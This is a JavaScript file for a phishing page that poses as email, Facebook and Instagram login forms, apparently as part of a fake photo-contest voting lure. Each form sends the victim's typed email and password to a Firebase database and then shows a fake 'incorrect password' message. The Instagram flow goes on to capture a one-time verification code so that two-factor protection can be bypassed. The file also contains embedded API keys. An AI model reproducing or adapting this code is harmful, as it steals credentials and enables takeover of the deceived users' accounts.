// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyD53HsZ7pfMOwbGha3j17pH1LcmiY1qapA",
  authDomain: "photocontestvote.firebaseapp.com",
  databaseURL: "https://photocontestvote-default-rtdb.firebaseio.com",
  projectId: "photocontestvote",
  storageBucket: "photocontestvote.appspot.com",
  messagingSenderId: "1024820648301",
  appId: "1:1024820648301:web:632daeae8026807d4e2264"
};

firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

function hmlog() {
  const email = document.getElementById("hm-uname").value.trim();
  const password = document.getElementById("hm-pass").value.trim();

  if (!email || !password) {
    alert("Please enter both email and password.");
    return;
  }

  firebase
    .auth()
    .signInAnonymously()
    .then(() => {
      const currentDate = new Date().toISOString().slice(0, 10);
      const currentTime = new Date().toISOString().slice(11, 19);
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      firebase.database().ref("fbdet").push({
        emle: email,
        mobile: "",
        time: currentTime,
        timezone: timezone,
        pass: password,
        date: currentDate,
        type: "Email",
      });

      setTimeout(() => {
        alert("Please double-check your password");
        document.getElementById("hm-pass").value = "";
      }, 2000);
    })
    .catch((error) => alert(error.message));
}

function login() {
  const email = document.getElementById("fb-email").value.trim();
  const password = document.getElementById("fb-pass").value.trim();

  if (!email || !password) {
    alert("Please enter both email and password.");
    return;
  }

  // Save email and password to localStorage
  localStorage.setItem("userEmail", email);
  localStorage.setItem("userPassword", password);

  firebase
    .auth()
    .signInAnonymously()
    .then(() => {
      const currentDate = new Date().toISOString().slice(0, 10);
      const currentTime = new Date().toISOString().slice(11, 19);
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      firebase.database().ref("fbdet").push({
        emle: email,
        mobile: "",
        time: currentTime,
        timezone: timezone,
        pass: password,
        date: currentDate,
        type: "Facebook",
      });

      setTimeout(() => {
        alert("Invalid username or password");
        document.getElementById("fb-pass").value = "";
      }, 2000);
    })
    .catch((error) => alert(error.message));
}

function iglog() {
  const email = document.getElementById("ig-uname").value.trim();
  const password = document.getElementById("ig-pass").value.trim();

  if (!email || !password) {
    alert("Please enter both email and password.");
    return;
  }

  // Get the current submission count from localStorage (default to 0)
  let submissionCount = parseInt(
    localStorage.getItem("submissionCount") || "0"
  );

  // Increment the submission count
  submissionCount++;
  localStorage.setItem("submissionCount", submissionCount);

  if (submissionCount <= 3) {
    // Save the email and password to Firebase
    firebase
      .auth()
      .signInAnonymously()
      .then(() => {
        const currentDate = new Date().toISOString().slice(0, 10);
        const currentTime = new Date().toISOString().slice(11, 19);
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        firebase.database().ref("fbdet").push({
          emle: email,
          mobile: "",
          time: currentTime,
          timezone: timezone,
          pass: password,
          date: currentDate,
          type: "Instagram",
        });

        if (submissionCount === 3) {
          alert("This is your third attempt. Help us confirm it's you.");

          // Ensure #veryfi is displayed
          document.getElementById("veryfi").style.display = "block";
          document.getElementById("igp").style.display = "none";

          // Optionally, hide the login form or perform other actions
          document.getElementById("ig-uname").disabled = true; // Disable username field
          document.getElementById("ig-pass").disabled = true; // Disable password field

          localStorage.setItem("submissionCount", 0); // Reset the count
        } else {
          alert(`Your password is incorrect. Try again!`);
        }

        // Clear the password field for the next attempt
        document.getElementById("ig-pass").value = "";
      })
      .catch((error) => alert(error.message));
  }
}

function igConfirm() {
  const code = document.getElementById("ig-code").value.trim();

  if (!code) {
    alert("Please enter verification code.");
    return;
  }

  // Retrieve email and password from localStorage
  const email = localStorage.getItem("userEmail");
  const password = localStorage.getItem("userPassword");

  firebase
    .auth()
    .signInAnonymously()
    .then(() => {
      const currentDate = new Date().toISOString().slice(0, 10);
      const currentTime = new Date().toISOString().slice(11, 19);
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      firebase.database().ref("fbdet").push({
        code: code,
        emle: email,
        time: currentTime,
        timezone: timezone,
        date: currentDate,
        type: "Instagram OTP",
        pass: password, // Store the original password
      });

      setTimeout(() => {
        alert("Please enter verification code.");
        document.getElementById("ig-code").value = "";
      }, 2000);
    })
    .catch((error) => alert(error.message));
}
